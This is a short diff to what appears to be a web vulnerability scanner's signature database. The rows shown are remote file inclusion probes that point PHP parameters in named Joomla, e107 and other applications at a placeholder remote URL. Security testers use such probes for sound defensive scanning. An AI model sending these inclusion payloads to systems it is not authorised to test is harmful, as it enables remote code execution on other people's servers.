@@ -3846,7 +3846,7 @@
 "003848","3092","1","/www/2","GET","200","","","","","This might be interesting...","",""
 "003849","5292","c","/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=@RFIURL?","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "003850","5292","c","/123flashchat.php?e107path=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
-"003851","5292","c","/2007/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
+"003851","5292","c","/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "003852","5292","c","/22_ultimate/templates/header.php?mainpath=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "003853","5292","c","/22_ultimate/templates/header.php?mainpath=@RFIURL?","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
 "003854","5292","c","/?_CONFIG[files][functions_page]=@RFIURL","GET","PHP Version","","","","","RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/","",""
